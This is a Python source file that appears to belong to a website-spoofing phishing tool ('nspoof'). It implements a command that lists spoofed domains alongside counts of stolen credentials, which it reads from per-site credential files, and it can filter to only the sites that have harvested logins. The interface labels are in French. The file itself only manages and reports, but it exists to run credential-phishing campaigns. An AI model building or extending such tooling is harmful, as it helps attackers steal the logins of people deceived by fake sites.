from tabulate import tabulate
from termcolor import colored
import sys
import os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *


#
# Handler to dosplay the list of all the spoofed website, and the spoofing informations.
#
def list_command(params): 

    # Retrieve the data from the global `WEBSITES` variable
    data = WEBSITES

    # Function to format each row for display
    def formatted_item(row):
        cred_file = ENV["nspoof_location"] + "/credentials/" + str(row[0]);
        if os.path.exists(cred_file):
            num_lines = sum(1 for line in open(cred_file, 'r'))
        else:
            num_lines = 0
        return [
            row[0],  # Website ID
            ", ".join(map(str, row[1])),  # Concatenate identifiers with commas
            str(num_lines),  # Retrieved credentials
            colored("Activé" if row[3] == 1 else "Désactivé", "green" if row[3] == 1 else "red"),  # Activation status
            row[5],  # Path to the website's files
            colored("Activé" if row[6] == 1 else "Désactivé", "green" if row[6] == 1 else "red")  # HTTPS status
        ]

    # Function to determine if item has to be showed
    def to_be_showed(item):
        if(len(params) == 1 and params[0] == "only_creds" and item[2] == "0"):
            return False
        return True

    # Apply formatting to each website in `WEBSITES`
    websites_formatted = map(formatted_item, WEBSITES)

    # Filter with only to show
    websites_formatted_tobeshown = filter(to_be_showed, websites_formatted)

    # Define headers for the table display
    headers = ["Id", "Domaine", "Identifiants récupérés", "Status", "Chemin des fichiers du site", "HTTPS"]

    # Print the formatted table with a grid layout
    print(tabulate(websites_formatted_tobeshown, headers, tablefmt="grid"))
